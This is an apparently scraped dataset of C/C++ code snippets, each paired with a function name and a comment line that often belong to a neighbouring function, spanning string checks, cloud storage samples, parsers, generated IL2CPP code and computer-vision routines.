{"content":"{'function_name': 'isIcecreamSandwich', 'docstring': \"\/\/case when beginning and end aren't equal\\r\", 'code': 'int main()\\r\\n{\\r\\n    std::cout << std::boolalpha;\\r\\n\\r\\n    \/\/examples\\r\\n    std::cout << isIcecreamSandwich(\"AABBBAA\") << \\'\\\\n\\';\\r\\n    std::cout << isIcecreamSandwich(\"3&&3\") << \\'\\\\n\\';\\r\\n    std::cout << isIcecreamSandwich(\"yyyyymmmmmmmmyyyyy\") << \\'\\\\n\\';\\r\\n    std::cout << isIcecreamSandwich(\"hhhhhhhhmhhhhhhhh\") << \"\\\\n\\\\n\";\\r\\n\\r\\n    \/\/aren\\'t sandwiches\\r\\n    std::cout << isIcecreamSandwich(\"BBBBB\") << \\'\\\\n\\';\\r\\n    std::cout << isIcecreamSandwich(\"AAACCCAA\") << \\'\\\\n\\';\\r\\n    std::cout << isIcecreamSandwich(\"AACDCAA\") << \\'\\\\n\\';\\r\\n    std::cout << isIcecreamSandwich(\"A\") << \\'\\\\n\\';\\r\\n\\r\\n    return 0;\\r\\n}'}","id":3226}
{"content":"{'function_name': 'AngleWeight', 'docstring': '\/\/\\treturn (1 - 2 * pow(fabs(angle) \/ PI, 20));\\r', 'code': 'bool StrokeFitting_DynamicProgramming(std::vector<POINT> &rgPoints, std::vector<BasicStroke> &rgResult, Matrix<double> &rgDistance, EstimateStrokeFunction EstimateStroke, double SegmentationPenalty)\\r\\n{\\r\\n\\tint\\t\\tn = (int)rgPoints.size();\\r\\n\\tint\\t\\tiLastRow = 0;\\r\\n\\tbool\\tbContinue;\\r\\n\\tdouble\\terr;\\r\\n\\r\\n\\tBasicStroke\\t\\t\\tstroke;\\r\\n\\tMatrix<double>\\t\\t\\trgErrors(n, n);\\r\\n\\tMatrix<BasicStroke>\\trgStrokes(n, n);\\r\\n\\tMatrix<BasicStroke> rgFits(n, n);\\r\\n\\r\\n\\t\/\/Dynamic programming for segmentation\\r\\n\\tfor (int i = 0; i < n; i++)\\r\\n\\t{\\r\\n\\t\\tbContinue\\t= false;\\r\\n\\t\\tiLastRow\\t= i;\\r\\n\\r\\n\\t\\tfor (int j = i + 1; j < n; j++)\\r\\n\\t\\t{\\r\\n\\t\\t\\tif (i == 0)\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\trgFits[i][j]\\t=\\tEstimateStroke(rgDistance, rgPoints, 0, j);\\r\\n\\t\\t\\t\\trgStrokes[i][j] =\\trgFits[i][j];\\r\\n\\t\\t\\t\\trgErrors[i][j]\\t=\\trgStrokes[i][j].error + \\r\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tSegmentationPenalty * (1 - (rgDistance[i][j] \/ rgDistance[0][n - 1]));\\r\\n\\t\\t\\t\\tbContinue = true;\\r\\n\\t\\t\\t}\\r\\n\\t\\t\\telse\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\trgErrors[i][j] = 1e+50;\\r\\n\\r\\n\\t\\t\\t\\tif (rgDistance[i][j] < STROKE_MINIMAL_LENGTH)\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\tcontinue;\\r\\n\\t\\t\\t\\t}\\r\\n\\r\\n\\t\\t\\t\\tfor (int k = i; k < j; k++)\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\tif (rgErrors[i - 1][k] < rgErrors[i - 1][n - 1])\\r\\n\\t\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\t\\tif (rgFits[k][j].iStrokeType == PRIMITIVE_UNKNOWN)\\r\\n\\t\\t\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\t\\t\\trgFits[k][j] = EstimateStroke(rgDistance, rgPoints, k, j);\\r\\n\\t\\t\\t\\t\\t\\t}\\r\\n\\r\\n\\t\\t\\t\\t\\t\\tstroke\\t=\\trgFits[k][j];\\r\\n\\t\\t\\t\\t\\t\\terr\\t\\t=\\trgErrors[i - 1][k]\\t+ \\r\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tstroke.error\\t\\t+\\r\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tSegmentationPenalty * AngleWeight(rgStrokes[i - 1][k], stroke) +\\r\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tSegmentationPenalty * (1 - (min(rgDistance[0][k], rgDistance[k][j]) \/ rgDistance[0][n - 1]));\\r\\n\\r\\n\\t\\t\\t\\t\\t\\tif (err < rgErrors[i][j])\\r\\n\\t\\t\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\t\\t\\trgErrors[i][j]\\t= err;\\r\\n\\t\\t\\t\\t\\t\\t\\trgStrokes[i][j]\\t= stroke;\\r\\n\\t\\t\\t\\t\\t\\t}\\r\\n\\t\\t\\t\\t\\t}\\r\\n\\t\\t\\t\\t}\\r\\n\\r\\n\\t\\t\\t\\tif (rgErrors[i][j] < rgErrors[i - 1][n - 1])\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\tbContinue = true;\\r\\n\\t\\t\\t\\t}\\r\\n\\t\\t\\t}\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tif (!bContinue) break;\\r\\n\\t}\\r\\n\\r\\n\\t\/\/Find the segmentation with minimal error \\r\\n\\tdouble\\tminErr\\t= 1e+50;\\r\\n\\tint\\t\\tminSplit= -1;\\r\\n\\r\\n\\tfor (int i = 0; i <= iLastRow; i++)\\r\\n\\t{\\r\\n\\t\\tif (rgErrors[i][n - 1] < minErr)\\r\\n\\t\\t{\\r\\n\\t\\t\\tminErr\\t= rgErrors[i][n - 1];\\r\\n\\t\\t\\tminSplit= i;\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\tif (minSplit == -1)\\r\\n\\t{\\r\\n\\t\\treturn false;\\r\\n\\t}\\r\\n\\r\\n\\tn = n - 1;\\r\\n\\tfor (int i = minSplit; i >= 0; i--)\\r\\n\\t{\\r\\n\\t\\trgResult.insert(rgResult.begin(), rgStrokes[i][n]);\\r\\n\\t\\tn = rgStrokes[i][n].iStartPoint;\\r\\n\\t}\\r\\n\\r\\n\\treturn true;\\r\\n}'}","id":3228}
{"content":"{'function_name': 'GetBucketLabels', 'docstring': '\/\/! [get bucket labels] [START storage_get_bucket_labels]', 'code': 'void RemoveBucketLabel(google::cloud::storage::Client client,\\n                       std::vector<std::string> const& argv) {\\n  \/\/! [remove bucket label] [START storage_remove_bucket_label]\\n  namespace gcs = ::google::cloud::storage;\\n  using ::google::cloud::StatusOr;\\n  [](gcs::Client client, std::string const& bucket_name,\\n     std::string const& label_key) {\\n    StatusOr<gcs::BucketMetadata> updated = client.PatchBucket(\\n        bucket_name, gcs::BucketMetadataPatchBuilder().ResetLabel(label_key));\\n    if (!updated) throw std::move(updated).status();\\n\\n    std::cout << \"Successfully reset label \" << label_key << \" on bucket  \"\\n              << updated->name() << \".\";\\n    if (updated->labels().empty()) {\\n      std::cout << \" The bucket now has no labels.\\\\n\";\\n      return;\\n    }\\n    std::cout << \" The bucket labels are now:\";\\n    for (auto const& kv : updated->labels()) {\\n      std::cout << \"\\\\n  \" << kv.first << \": \" << kv.second;\\n    }\\n    std::cout << \"\\\\n\";\\n  }\\n  \/\/! [remove bucket label] [END storage_remove_bucket_label]\\n  (std::move(client), argv.at(0), argv.at(1));\\n}'}","id":3230}
{"content":"{'function_name': 'demosaicb_demosaic_update_0_read_bundle_read', 'docstring': '\/\/ demosaic_rd1', 'code': 'inline hw_uint<16> demosaicb_rd0_select(denoise_cache& denoise, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaicb_rd0 read pattern: { demosaicb_update_0[d0, d1] -> denoise[-1 + 2d0, -1 + d1] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaicb_update_0[d0, d1] -> [3 + d1, 2 + d0, 4] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { denoise_update_0[d0, d1] -> [2 + d1, 1 + d0, 3] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ DD fold: { demosaicb_update_0[d0, d1] -> 1928 : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  auto value_denoise_denoise_update_0_write1 = denoise.denoise_denoise_update_0_write1_merged_banks_9.peek_1928();\\n  return value_denoise_denoise_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3231}
{"content":"{'function_name': 'QueryDeviceCapability', 'docstring': '\/\/supporeted_effect:\\r', 'code': 'bool ParseCapability(const BSTR xmlData, LedCapability& capability)\\r\\n{\\r\\n\\t\/\/TiXmlDocument* xml= new TiXmlDocument;\\r\\n\\r\\n\\tTiXmlDocument* xml = new TiXmlDocument;\\r\\n\\txml->Parse(Wcs2Str(xmlData).c_str(), 0, TIXML_ENCODING_UTF8);\\r\\n\\r\\n\\tTiXmlElement* root = xml->RootElement();\\r\\n\\r\\n\\tif (root == NULL)\\r\\n\\t\\treturn false;\\r\\n\\r\\n\\tTiXmlElement* element;\\r\\n\\r\\n\\t\/\/ version\\r\\n\\telement = root->FirstChildElement(\"version\");\\r\\n\\tif (element != NULL)\\r\\n\\t\\tcapability.version = element->GetText();\\r\\n\\telse\\r\\n\\t\\tcapability.version = \"\";\\r\\n\\r\\n\\t\/\/ type\\r\\n\\telement = root->FirstChildElement(\"type\");\\r\\n\\tif (element != NULL)\\r\\n\\t\\tcapability.type = atoi( element->GetText() );\\r\\n\\telse\\r\\n\\t\\tcapability.type = 0;\\r\\n\\r\\n\\t\/\/ device\\r\\n\\telement = root->FirstChildElement(\"device\");\\r\\n\\tif (element != NULL)\\r\\n\\t\\tQueryDeviceCapability(element, capability);\\r\\n\\r\\n\\r\\n\\r\\n\\treturn true;\\r\\n}'}","id":3235}
{"content":"{'function_name': 'GetResolution', 'docstring': '\/\/ screen viewport, use the device resolution instead (bug 779527).', 'code': \"static nsresult\\nGetScan(nsPresContext* aPresContext, const nsMediaFeature*,\\n        nsCSSValue& aResult)\\n{\\n    \/\/ Since Goanna doesn't support the 'tv' media type, the 'scan'\\n    \/\/ feature is never present.\\n    aResult.Reset();\\n    return NS_OK;\\n}\"}","id":3242}
{"content":"{'function_name': 'Is2ContoursInt', 'docstring': '\/\/(3)\u5224\u65adpLoop1\u5b64\u5c9b\u4e0epLoop2\u7684\u8ddd\u79bb', 'code': 'BOOL IsInSameArea( CSmartLoop * pLoop1, CSmartLoop * pLoop2, double dTol )\\n{\\n\\tif( !pLoop1 || !pLoop2 ) return FALSE ;\\n\\t\/\/(1)\u5224\u65ad\u662f\u5426\u76f8\u4ea4\\n\\tif( Is2ContoursInt( pLoop1, pLoop2, dTol ) ) return TRUE ;\\n\\t\/\/(2)\u5224\u65ad\u662f\u5426\u843d\u5728\u53e6\u4e00\u4e2a\u533a\u57df\u5185\\n\\tCSmartLoop *pIsland = NULL ;\\n\\tPNT2D point ;\\n\\tpLoop1->m_pCurve->GetStart( point ) ;\\n\\tif ( pLoop2->IsPointIn( point ) )\\n\\t{\\n\\t\\tpIsland = pLoop2->GetIsland() ;\\n\\t\\tfor ( ; pIsland; pIsland = pIsland->next )\\n\\t\\t{\\n\\t\\t\\tif( pIsland->IsPointIn( point ) )  return FALSE ;\\n\\t\\t}\\n\\t\\treturn TRUE ;\\n\\t}\\n\\tpLoop2->m_pCurve->GetStart( point ) ;\\n\\tif ( pLoop1->IsPointIn( point ) )\\n\\t{\\n\\t\\tpIsland = pLoop1->GetIsland() ;\\n\\t\\tfor ( ; pIsland; pIsland = pIsland->next )\\n\\t\\t{\\n\\t\\t\\tif( pIsland->IsPointIn( point ) ) return FALSE ;\\n\\t\\t}\\n\\t\\treturn TRUE ;\\n\\t}\\n\\treturn FALSE ;\\n}'}","id":3243}
{"content":"{'function_name': 'MimeOleGetPropA', 'docstring': '\/\/ Return the Data\\r', 'code': 'MIMEOLEAPI MimeOleSetPropA(\\r\\n                           IMimePropertySet   *pPropertySet,\\r\\n                           LPCSTR              pszName,\\r\\n                           DWORD               dwFlags,\\r\\n                           LPCSTR              pszData)\\r\\n{\\r\\n    \/\/ Invaid Arg\\r\\n    if (NULL == pPropertySet)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Initialzie PropVariant\\r\\n    PROPVARIANT rVariant;\\r\\n    rVariant.vt = VT_LPSTR;\\r\\n    rVariant.pszVal = (LPSTR)pszData;\\r\\n\\r\\n    \/\/ Call Method\\r\\n    return TrapError(pPropertySet->SetProp(pszName, dwFlags, &rVariant));\\r\\n}'}","id":3248}
{"content":"{'function_name': 'ForEachUpstreamEdge', 'docstring': '\/\/ Case 3.', 'code': 'void RecomputeMaxUpstreamDelays(Node& node,\\n                                std::map<ThreadId, std::vector<fit::closure>>& closures) {\\n  FX_CHECK(node.type() != Node::Type::kMeta);\\n\\n  \/\/ Output pipelines (currently) have no upstream delays defined.\\n  if (node.pipeline_direction() == PipelineDirection::kOutput) {\\n    return;\\n  }\\n\\n  std::vector<Node*> stack = {&node};\\n\\n  while (!stack.empty()) {\\n    auto node = stack.back();\\n    stack.pop_back();\\n\\n    \/\/ At, top-of-graph producers upstream delay is determined by an external client.\\n    if (node->type() == Node::Type::kProducer && !node->parent()) {\\n      continue;\\n    }\\n\\n    \/\/ Recompute node->max_upstream_input_pipeline_delay().\\n    auto max_delay = zx::nsec(0);\\n    ForEachUpstreamEdge(*node, [&max_delay, node](const Node& source) {\\n      auto edge_delay =\\n          node->PresentationDelayForSourceEdge((source.dest().get() == node) ? &source : nullptr);\\n      auto source_delay = (source.pipeline_direction() == PipelineDirection::kInput)\\n                              ? source.max_upstream_input_pipeline_delay()\\n                              : zx::nsec(0) \/* stop at loopback interfaces *\/;\\n      max_delay = std::max(max_delay, edge_delay + source_delay);\\n    });\\n\\n    if (node->max_upstream_input_pipeline_delay() == max_delay) {\\n      continue;\\n    }\\n\\n    \/\/ It changed: update `node` and recurse downwards.\\n    if (auto pair = node->SetMaxDelays({.upstream_input_pipeline_delay = max_delay}); pair) {\\n      closures.try_emplace(pair->first, std::vector<fit::closure>{})\\n          .first->second.push_back(std::move(pair->second));\\n    }\\n\\n    ForEachDownstreamEdge(*node, [&stack](Node& dest) { stack.push_back(&dest); });\\n  }\\n}'}","id":3251}
{"content":"{'function_name': 'Array_Sort_TisCustomAttributeTypedArgument_t4043223540_m1081752256_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'void Dictionary_2_Do_ICollectionCopyTo_TisKeyValuePair_2_t1627747851_m2536766696_gshared (Dictionary_2_t3070427539 * __this, Il2CppArray * ___array, int32_t ___index, Transform_1_t1288062284 * ___transform, const MethodInfo* method)\\n{\\n\\tstatic bool s_Il2CppMethodIntialized;\\n\\tif (!s_Il2CppMethodIntialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Dictionary_2_Do_ICollectionCopyTo_TisKeyValuePair_2_t1627747851_m2536766696_MetadataUsageId);\\n\\t\\ts_Il2CppMethodIntialized = true;\\n\\t}\\n\\tType_t * V_0 = NULL;\\n\\tType_t * V_1 = NULL;\\n\\tException_t1145979430 * V_2 = NULL;\\n\\tException_t1145979430 * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t1145979430 * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = 0;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\tType_t * L_0 = Type_GetTypeFromHandle_m432505302(NULL \/*static, unused*\/, (RuntimeTypeHandle_t2078935215 )LoadTypeToken(IL2CPP_RGCTX_TYPE(method->rgctx_data, 0)), \/*hidden argument*\/NULL);\\n\\t\\tV_0 = (Type_t *)L_0;\\n\\t\\tIl2CppArray * L_1 = ___array;\\n\\t\\tNullCheck((Il2CppObject *)L_1);\\n\\t\\tType_t * L_2 = Object_GetType_m191970594((Il2CppObject *)L_1, \/*hidden argument*\/NULL);\\n\\t\\tNullCheck((Type_t *)L_2);\\n\\t\\tType_t * L_3 = VirtFuncInvoker0< Type_t * >::Invoke(43 \/* System.Type System.Type::GetElementType() *\/, (Type_t *)L_2);\\n\\t\\tV_1 = (Type_t *)L_3;\\n\\t}\\n\\nIL_0017:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t{\\n\\t\\t\\tType_t * L_4 = V_0;\\n\\t\\t\\tNullCheck((Type_t *)L_4);\\n\\t\\t\\tbool L_5 = VirtFuncInvoker0< bool >::Invoke(30 \/* System.Boolean System.Type::get_IsPrimitive() *\/, (Type_t *)L_4);\\n\\t\\t\\tif (L_5)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_002d;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0022:\\n\\t\\t{\\n\\t\\t\\tType_t * L_6 = V_1;\\n\\t\\t\\tNullCheck((Type_t *)L_6);\\n\\t\\t\\tbool L_7 = VirtFuncInvoker0< bool >::Invoke(30 \/* System.Boolean System.Type::get_IsPrimitive() *\/, (Type_t *)L_6);\\n\\t\\t\\tif (!L_7)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_002d:\\n\\t\\t{\\n\\t\\t\\tType_t * L_8 = V_1;\\n\\t\\t\\tType_t * L_9 = V_0;\\n\\t\\t\\tNullCheck((Type_t *)L_8);\\n\\t\\t\\tbool L_10 = VirtFuncInvoker1< bool, Type_t * >::Invoke(40 \/* System.Boolean System.Type::IsAssignableFrom(System.Type) *\/, (Type_t *)L_8, (Type_t *)L_9);\\n\\t\\t\\tif (L_10)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0039:\\n\\t\\t{\\n\\t\\t\\tException_t1145979430 * L_11 = (Exception_t1145979430 *)il2cpp_codegen_object_new(Exception_t1145979430_il2cpp_TypeInfo_var);\\n\\t\\t\\tException__ctor_m3886110570(L_11, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_11);\\n\\t\\t}\\n\\nIL_003f:\\n\\t\\t{\\n\\t\\t\\tIl2CppArray * L_12 = ___array;\\n\\t\\t\\tint32_t L_13 = ___index;\\n\\t\\t\\tTransform_1_t1288062284 * L_14 = ___transform;\\n\\t\\t\\tNullCheck((Dictionary_2_t3070427539 *)__this);\\n\\t\\t\\t((  void (*) (Dictionary_2_t3070427539 *, ObjectU5BU5D_t3632007997*, int32_t, Transform_1_t1288062284 *, const MethodInfo*))IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 1)->method)((Dictionary_2_t3070427539 *)__this, (ObjectU5BU5D_t3632007997*)((ObjectU5BU5D_t3632007997*)Castclass(L_12, ObjectU5BU5D_t3632007997_il2cpp_TypeInfo_var)), (int32_t)L_13, (Transform_1_t1288062284 *)L_14, \/*hidden argument*\/IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 1));\\n\\t\\t\\tgoto IL_0069;\\n\\t\\t}\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__exception_local = (Exception_t1145979430 *)e.ex;\\n\\t\\tif(il2cpp_codegen_class_is_assignable_from (Exception_t1145979430_il2cpp_TypeInfo_var, e.ex->object.klass))\\n\\t\\t\\tgoto CATCH_0052;\\n\\t\\tthrow e;\\n\\t}\\n\\nCATCH_0052:\\n\\t{ \/\/ begin catch(System.Exception)\\n\\t\\t{\\n\\t\\t\\tV_2 = (Exception_t1145979430 *)((Exception_t1145979430 *)__exception_local);\\n\\t\\t\\tException_t1145979430 * L_15 = V_2;\\n\\t\\t\\tArgumentException_t2320721629 * L_16 = (ArgumentException_t2320721629 *)il2cpp_codegen_object_new(ArgumentException_t2320721629_il2cpp_TypeInfo_var);\\n\\t\\t\\tArgumentException__ctor_m3312963299(L_16, (String_t*)_stringLiteral3845490374, (String_t*)_stringLiteral1185213181, (Exception_t1145979430 *)L_15, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_16);\\n\\t\\t}\\n\\nIL_0064:\\n\\t\\t{\\n\\t\\t\\tgoto IL_0069;\\n\\t\\t}\\n\\t} \/\/ end catch (depth: 1)\\n\\nIL_0069:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":3261}
{"content":"{'function_name': 'main', 'docstring': '\/\/prof();\\r', 'code': 'std::string parsing(std::string str)\\r\\n{\\r\\n\\tstr = str + \"#\";\\r\\n\\tint prav = 15;\\r\\n\\tunsigned int x = 0, i, j;\\r\\n\\t\\r\\n\\tchar stroki[14] = { \\'S\\', \\'T\\', \\'s\\', \\'t\\', \\'U\\', \\'W\\', \\'+\\', \\'-\\', \\'*\\', \\'\/\\', \\'(\\', \\')\\', \\'n\\', \\'#\\' };\\r\\n\\tchar stolb[8] = { \\'+\\', \\'-\\', \\'*\\', \\'\/\\', \\'(\\', \\')\\', \\'n\\', \\'#\\' };\\r\\n\\tint tabl[14][8] =\\r\\n\\t{ { 0,  1,  0,  0,  1,  0,  1,  0 },\\r\\n\\t{ 0,  5,  0,  0,  5,  0,  5,  0 },\\r\\n\\t{ 2,  3,  0,  0,  0,  4,  0,  4 },\\r\\n\\t{ 8,  8,  6,  7,  0,  8,  0,  8 },\\r\\n\\t{ 0,  10, 0,  0,  9,  0, 11,  0 },\\r\\n\\t{ 13, 13, 13, 13, 0, 13, 12, 13 },\\r\\n\\t{ -1, 0,  0,  0,  0,  0,  0,  0 },\\r\\n\\t{ 0, -1,  0,  0,  0,  0,  0,  0 },\\r\\n\\t{ 0,  0, -1,  0,  0,  0,  0,  0 },\\r\\n\\t{ 0,  0,  0, -1,  0,  0,  0,  0 },\\r\\n\\t{ 0,  0,  0,  0, -1,  0,  0,  0 },\\r\\n\\t{ 0,  0,  0,  0,  0, -1,  0,  0 },\\r\\n\\t{ 0,  0,  0,  0,  0,  0, -1,  0 },\\r\\n\\t{ 0,  0,  0,  0,  0,  0,  0,  14 } };\\r\\n\\r\\n\\tstd::list <char> List;\\r\\n\\tList.push_back(\\'#\\');\\r\\n\\tList.push_back(\\'S\\');\\r\\n\\r\\n\\twhile (prav != 14 && prav != 0)\\r\\n\\t{\\r\\n\\t\\tif (isdigit(List.back()))\\r\\n\\t\\t\\ti = 12;\\r\\n\\t\\telse\\r\\n\\t\\t{\\r\\n\\t\\t\\tfor (i = 0; i < 14; i++)\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\tif (stroki[i] == List.back())\\r\\n\\t\\t\\t\\t\\tbreak;\\r\\n\\t\\t\\t}\\r\\n\\t\\t}\\r\\n\\t\\tif (isdigit(str[x]))\\r\\n\\t\\t\\tj = 6;\\r\\n\\t\\telse\\r\\n\\t\\t{\\r\\n\\t\\t\\tfor (j = 0; j < 8; j++)\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\tif (stolb[j] == str[x])\\r\\n\\t\\t\\t\\t\\tbreak;\\r\\n\\t\\t\\t}\\r\\n\\t\\t}\\r\\n\\t\\tprav = tabl[i][j];\\r\\n\\t\\tswitch (prav)\\r\\n\\t\\t{\\r\\n\\t\\tcase 0:\\r\\n\\t\\t\\t\/\/std::cout << \"\\\\nError\\\\n\";\\r\\n\\t\\t\\tstr = \"error\";\\r\\n\\t\\t\\t\/\/str[str.length()-1] = \\'h\\';\\r\\n\\t\\t\\treturn str;\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 1:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tList.push_back(\\'s\\');\\r\\n\\t\\t\\tList.push_back(\\'T\\');\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 2:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tList.push_back(\\'s\\');\\r\\n\\t\\t\\tList.push_back(\\'T\\');\\r\\n\\t\\t\\tList.push_back(\\'+\\');\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 3:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tList.push_back(\\'s\\');\\r\\n\\t\\t\\tList.push_back(\\'T\\');\\r\\n\\t\\t\\tList.push_back(\\'-\\');\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 4:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 5:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tList.push_back(\\'t\\');\\r\\n\\t\\t\\tList.push_back(\\'U\\');\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 6:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tList.push_back(\\'t\\');\\r\\n\\t\\t\\tList.push_back(\\'U\\');\\r\\n\\t\\t\\tList.push_back(\\'*\\');\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 7:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tList.push_back(\\'t\\');\\r\\n\\t\\t\\tList.push_back(\\'U\\');\\r\\n\\t\\t\\tList.push_back(\\'\/\\');\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 8:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 9:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tList.push_back(\\')\\');\\r\\n\\t\\t\\tList.push_back(\\'S\\');\\r\\n\\t\\t\\tList.push_back(\\'(\\');\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 10:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tList.push_back(\\'W\\');\\r\\n\\t\\t\\tList.push_back(\\'-\\');\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 11:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tList.push_back(\\'W\\');\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 12:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tList.push_back(\\'W\\');\\r\\n\\t\\t\\tList.push_back(str[x]);\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 13:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase -1:\\r\\n\\t\\t\\tList.pop_back();\\r\\n\\t\\t\\tx++;\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase 14:\\r\\n\\t\\t\\t\/\/std::cout << \"\\\\nSuccess parsing\\\\n\";\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\tstr.erase(str.begin() + str.length() - 1, str.end());\\r\\n\\t\/\/std::cout << str << std::endl;\\r\\n\\t\\r\\n\\t\/\/str[str.length() - 1] = \\'h\\';\\r\\n\\treturn str;\\r\\n}'}","id":3265}
{"content":"{'function_name': 'main', 'docstring': '\/\/ is Bipartite or not ', 'code': 'int main() {\\n\\t\/\/ your code goes here\\n\\n\\tint n;\\n\\tcin>>n;\\n\\t\\n\\t\\n\\tint x,y;\\n\\twhile(n--){\\n\\t\\tcin>>x>>y;\\n\\t\\taddedge(x,y);\\n\\t}\\n    \\n    if(dfs(adj,1))cout<<\"cycle exists\";\\n    else cout<<\"no cycle\";\\n\\treturn 0;\\n}'}","id":3267}
{"content":"{'function_name': 'PlayerRectExtraction', 'docstring': '\/\/ Gaussian Mixture Model', 'code': 'std::vector<cv::Rect> TopPlayerRectRefinement(std::vector<cv::Rect> inputrectangle, std::string filename) {\\n\\t\\tcv::VideoCapture stream(filename);\\n\\t\\tif (!stream.isOpened()) {\\n\\t\\t\\tstd::cerr << \"Unable to open video file: \" << filename << \" !\" << std::endl;\\n\\t\\t\\texit(EXIT_FAILURE);\\n\\t\\t}\\n\\n\\t\\t\/\/ grab the first frame\\n\\t\\tcv::Mat frame_rgb;\\n\\t\\tstream.read(frame_rgb);\\n\\n\\t\\tstd::vector<cv::Rect> outputrectangle;\\n\\n\\t\\tfor (size_t i = 0; i < inputrectangle.size(); i++) {\\n\\t\\t\\toutputrectangle.push_back(inputrectangle[i]);\\n\\t\\t}\\n\\n\\t\\t\/\/for (size_t i = 0; i < inputrectangle.size(); i++) {\\n\\t\\t\/\/\\t\/\/ check and correct the x value\\n\\t\\t\/\/\\tif (inputrectangle[i].x == 0) {\\n\\t\\t\/\/\\t\\toutputrectangle[i].x = (int)(frame_rgb.cols \/ 2) - (int)(4.1 * frame_rgb.cols \/ 100);\\n\\t\\t\/\/\\t}\\n\\n\\t\\t\/\/\\t\/\/ check and correct the y value\\n\\t\\t\/\/\\tif (inputrectangle[i].y == 0) {\\n\\t\\t\/\/\\t\\toutputrectangle[i].y = (int)(frame_rgb.rows \/ 2) - (int)(18.75 * frame_rgb.rows \/ 100);\\n\\t\\t\/\/\\t}\\n\\n\\t\\t\/\/\\t\/\/ check and correct the width value\\n\\t\\t\/\/\\tif (inputrectangle[i].width < (5.86 * frame_rgb.cols \/ 100) || inputrectangle[i].width >(19.91 * frame_rgb.cols \/ 100)) {\\n\\t\\t\/\/\\t\\toutputrectangle[i].width = (int)(15 * frame_rgb.cols \/ 